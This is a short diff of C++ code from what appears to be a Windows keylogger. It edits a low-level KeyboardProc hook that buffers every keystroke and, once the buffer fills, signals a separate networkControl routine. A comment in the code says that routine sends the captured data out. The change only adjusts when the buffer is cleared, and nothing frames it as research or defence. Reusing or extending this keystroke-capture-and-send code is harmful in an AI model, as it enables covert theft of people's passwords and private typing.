@@ -128,16 +128,16 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             
             if(accBuffer.length() == DEF_ACC_BUFFER_SIZE){
                 wcout << accBuffer<<endl;
-                string s(accBuffer.begin(), accBuffer.end());
-                accBuffer.clear();
+                
+                
 
                 {
                     std::lock_guard<std::mutex> lock(m);
                     dataReady = true;
 
                 }
-                cv.notify_one();
-                
+                cv.notify_one();                                // the buffer gets cleared after sending the data in networkControl, making sure that the buffer is not empty before sending
+                             
             }
             
 
